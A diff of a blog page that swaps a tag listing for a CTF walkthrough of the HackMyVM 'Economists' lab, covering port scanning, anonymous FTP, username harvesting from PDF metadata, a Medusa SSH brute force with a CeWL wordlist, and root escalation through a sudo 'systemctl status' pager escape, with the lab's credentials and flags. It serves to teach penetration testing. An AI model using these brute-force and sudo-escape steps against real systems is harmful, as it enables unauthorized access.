@@ -3,22 +3,22 @@
 <meta http-equiv="content-type" content="text/html">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title itemprop="name">Apache | Null Blog</title>
-<meta property="og:title" content="Apache | Null Blog" />
-<meta name="twitter:title" content="Apache | Null Blog" />
-<meta itemprop="name" content="Apache | Null Blog" />
-<meta name="application-name" content="Apache | Null Blog" />
+<title itemprop="name">Economists - Walkthrough | Null Blog</title>
+<meta property="og:title" content="Economists - Walkthrough | Null Blog" />
+<meta name="twitter:title" content="Economists - Walkthrough | Null Blog" />
+<meta itemprop="name" content="Economists - Walkthrough | Null Blog" />
+<meta name="application-name" content="Economists - Walkthrough | Null Blog" />
 <meta property="og:site_name" content="Null Blog" />
 
-<meta name="description" content="CTF writeups, hacking notes, and walkthroughs.">
-<meta itemprop="description" content="CTF writeups, hacking notes, and walkthroughs." />
-<meta property="og:description" content="CTF writeups, hacking notes, and walkthroughs." />
-<meta name="twitter:description" content="CTF writeups, hacking notes, and walkthroughs." />
+<meta name="description" content="Walkthrough for the Economists machine.">
+<meta itemprop="description" content="Walkthrough for the Economists machine." />
+<meta property="og:description" content="Walkthrough for the Economists machine." />
+<meta name="twitter:description" content="Walkthrough for the Economists machine." />
 
 <meta property="og:locale" content="en-US" />
 <meta name="language" content="en-US" />
 
-  <link rel="alternate" hreflang="en" href="https://nvru.github.io/tags/apache/" title="" />
+  <link rel="alternate" hreflang="en" href="https://nvru.github.io/walkthrough/hmv/economists/" title="" />
 
 
 
@@ -28,26 +28,33 @@
 <meta name="generator" content="Hugo 0.164.0">
 
     
-    <meta property="og:url" content="https://nvru.github.io/tags/apache/">
+    <meta property="og:url" content="https://nvru.github.io/walkthrough/hmv/economists/">
 	<meta property="og:site_name" content="Null Blog">
-	<meta property="og:title" content="Apache">
-	<meta property="og:description" content="CTF writeups, hacking notes, and walkthroughs.">
+	<meta property="og:title" content="Economists - Walkthrough">
+	<meta property="og:description" content="Walkthrough for the Economists machine.">
 	<meta property="og:locale" content="en_US">
-	<meta property="og:type" content="website">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="walkthrough">
+		<meta property="article:published_time" content="2026-07-17T00:00:00+00:00">
+		<meta property="article:modified_time" content="2026-07-17T00:00:00+00:00">
+		<meta property="article:tag" content="Ctf">
+		<meta property="article:tag" content="Walkthrough">
+		<meta property="article:tag" content="Linux">
+		<meta property="article:tag" content="Ftp">
+		<meta property="article:tag" content="Ssh">
+		<meta property="article:tag" content="Apache">
 
 
     
     
 	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="Apache">
-	<meta name="twitter:description" content="CTF writeups, hacking notes, and walkthroughs.">
+	<meta name="twitter:title" content="Economists - Walkthrough">
+	<meta name="twitter:description" content="Walkthrough for the Economists machine.">
 
 
     
 
-    <link rel="canonical" href="https://nvru.github.io/tags/apache/">
-    <link href="/tags/apache/index.xml" rel="alternate" type="application/rss+xml" title="Null Blog">
-    <link href="/tags/apache/index.xml" rel="feed" type="application/rss+xml" title="Null Blog">
+    <link rel="canonical" href="https://nvru.github.io/walkthrough/hmv/economists/">
     <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
@@ -109,7 +116,7 @@ stroke-linejoin="round" class="feather feather-home">
                 </li>
                 
                 <li>
-                    <a class="menu-link " href="/walkthrough/">
+                    <a class="menu-link active" href="/walkthrough/">
                         Walkthroughs
                     </a>
                     
@@ -165,135 +172,148 @@ stroke-linejoin="round" class="feather feather-home">
         </div>
     </nav>
 </div>
-<div class="wrapper list-page">
-    <header class="header">
-        <h1 class="header-title center">Apache</h1>
-    </header>
+
+<div class="wrapper post">
     <main class="page-content" aria-label="Content">
-        
-        
-        <h2 class="post-year">2026</h2>
+        <article>
+            <header class="header">
+                <h1 class="header-title">Economists - Walkthrough</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-07-17T00:00:00&#43;00:00" itemprop="datePublished"> 17 Jul 2026 </time>
+                </div>
+                
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#rustscan">RustScan</a></li>
+    <li><a href="#results">Results</a></li>
+  </ul>
 
-        
+  <ul>
+    <li><a href="#ftp">FTP</a></li>
+    <li><a href="#web-enumeration">Web Enumeration</a></li>
+    <li><a href="#ssh-password-attack">SSH Password Attack</a></li>
+  </ul>
 
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/economists/">Economists - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-17T00:00:00Z">
-        17 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/friendly/">Friendly - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-16T00:00:00Z">
-        16 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/printer2/">Printer2 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-14T00:00:00Z">
-        14 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/yuan112/">Yuan112 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-09T00:00:00Z">
-        9 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/yuan111/">Yuan111 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-09T00:00:00Z">
-        9 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/yuan114/">Yuan114 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-08T00:00:00Z">
-        8 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/jabita/">Jabita - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-07T00:00:00Z">
-        7 Jul 2026
-    </time>
-</article>
-
-
-         
-
-         
-
-    </main>
-</div><footer class="footer">
+  <ul>
+    <li><a href="#joesph--root">joesph → root</a></li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <h1 id="overview">Overview</h1>
+<ul>
+<li><strong>Attacker IP:</strong> <code>10.10.10.2</code></li>
+<li><strong>Target Machine IP:</strong> <code>10.10.10.26</code></li>
+</ul>
+<p>The objective was to enumerate the target, identify exposed services, gain initial access by brute-forcing SSH credentials obtained during enumeration, and escalate privileges by abusing a misconfigured <code>sudo</code> rule allowing execution of <code>systemctl</code>.</p>
+<p><img src="/images/hmv/economists/vm.png" alt="Machine information"></p>
+<hr>
+<h1 id="port-scanning">Port Scanning</h1>
+<h2 id="rustscan">RustScan</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rustscan -a 10.10.10.26 -- -sC -sV -A -oA nmap/rust
+</span></span></code></pre></div><h2 id="results">Results</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+</span></span><span style="display:flex;"><span>| -rw-rw-r--    Brochure-1.pdf
+</span></span><span style="display:flex;"><span>| -rw-rw-r--    Brochure-2.pdf
+</span></span><span style="display:flex;"><span>| -rw-rw-r--    Financial-infographics-poster.pdf
+</span></span><span style="display:flex;"><span>| -rw-rw-r--    Gameboard-poster.pdf
+</span></span><span style="display:flex;"><span>| -rw-rw-r--    Growth-timeline.pdf
+</span></span><span style="display:flex;"><span>| -rw-rw-r--    Population-poster.pdf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.41
+</span></span></code></pre></div><p>The target exposed three services:</p>
+<ul>
+<li>FTP (anonymous access enabled)</li>
+<li>SSH</li>
+<li>Apache HTTP server</li>
+</ul>
+<p>Anonymous FTP immediately stood out as the most promising attack surface.</p>
+<hr>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="ftp">FTP</h2>
+<p>Nmap revealed that anonymous authentication was enabled on the FTP service.</p>
+<p>After logging in as <code>anonymous</code>, I downloaded all available PDF files.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>anonymous
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mget ./*
+</span></span></code></pre></div><p><img src="/images/hmv/economists/ftp_pdfs.png" alt="FTP PDFs"></p>
+<p>Since the files looked like company documents, I inspected their metadata.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exiftool * | grep -i autho | cut -d <span style="color:#e6db74">&#34;:&#34;</span> -f2 | uniq &gt; ../../creds/users
+</span></span></code></pre></div><p>The metadata revealed several author names which were likely employee usernames.</p>
+<p><img src="/images/hmv/economists/exif_author.png" alt="PDF authors"></p>
+<p>Because SSH was available, these usernames would later become useful for password attacks.</p>
+<hr>
+<h2 id="web-enumeration">Web Enumeration</h2>
+<p>Browsing the website did not immediately reveal anything interesting.</p>
+<p>One useful piece of information was the company email address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>info@elite-economists.hmv
+</span></span></code></pre></div><p>This suggested the virtual host:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>elite-economists.hmv
+</span></span></code></pre></div><p>After adding it to <code>/etc/hosts</code>, I continued enumerating the website.</p>
+<p><img src="/images/hmv/economists/email.png" alt="Email address"></p>
+<p><img src="/images/hmv/economists/hosts.png" alt="Hosts entry"></p>
+<p>Neither directory brute forcing nor Nikto revealed anything useful, so I shifted my focus back to SSH.</p>
+<hr>
+<h2 id="ssh-password-attack">SSH Password Attack</h2>
+<p>Using the usernames recovered from the PDF metadata, I attempted password brute forcing.</p>
+<p><img src="/images/hmv/economists/hydra.png" alt="Hydra"></p>
+<p>RockYou did not produce any valid credentials, so I generated a custom wordlist using CeWL and used Medusa against SSH.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>medusa -M ssh <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-h 10.10.10.26 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-U creds/users <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-P misc/cewl_passwd
+</span></span></code></pre></div><p>A valid credential pair was recovered:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>joesph : wealthiest
+</span></span></code></pre></div><p><img src="/images/hmv/economists/medusa.png" alt="Medusa"></p>
+<hr>
+<h1 id="initial-access">Initial Access</h1>
+<p>Using the recovered credentials, I successfully logged in through SSH.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Username: joesph
+</span></span><span style="display:flex;"><span>Password: wealthiest
+</span></span></code></pre></div><p><img src="/images/hmv/economists/ssh_joseph.png" alt="SSH Login"></p>
+<hr>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<h2 id="joesph--root">joesph → root</h2>
+<p>The first step after obtaining a shell was checking the user&rsquo;s sudo permissions.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div><p>The output showed that <code>joesph</code> could execute:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/usr/bin/systemctl status
+</span></span></code></pre></div><p>as <strong>any user</strong>, including <strong>root</strong>, without providing a password.</p>
+<p><img src="/images/hmv/economists/sudo_perm.png" alt="Sudo permissions"></p>
+<p>The <code>systemctl status</code> command displays its output through the <code>less</code> pager by default.</p>
+<p>This is important because <code>less</code> allows spawning an interactive shell using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>!/bin/bash
+</span></span></code></pre></div><p>I started the allowed command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -u root /usr/bin/systemctl status
+</span></span></code></pre></div><p>Once inside the pager, I executed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>!/bin/bash
+</span></span></code></pre></div><p>This immediately spawned a root shell.</p>
+<p><img src="/images/hmv/economists/less.png" alt="Less escape"></p>
+<p>Verifying the current user confirmed successful privilege escalation to root</p>
+<p><img src="/images/hmv/economists/root.png" alt="Root shell"></p>
+<hr>
+<h1 id="credentials">Credentials</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>joesph:wealthiest
+</span></span></code></pre></div><hr>
+<h1 id="flags">Flags</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>user:HMV{37q3p33CsMJgJQbrbYZMUFfTu}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root:HMV{NwER6XWyM8p5VpeFEkkcGYyeJ}
+</span></span></code></pre></div>
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
     <span class="footer_item"> </span>
     &nbsp;
 
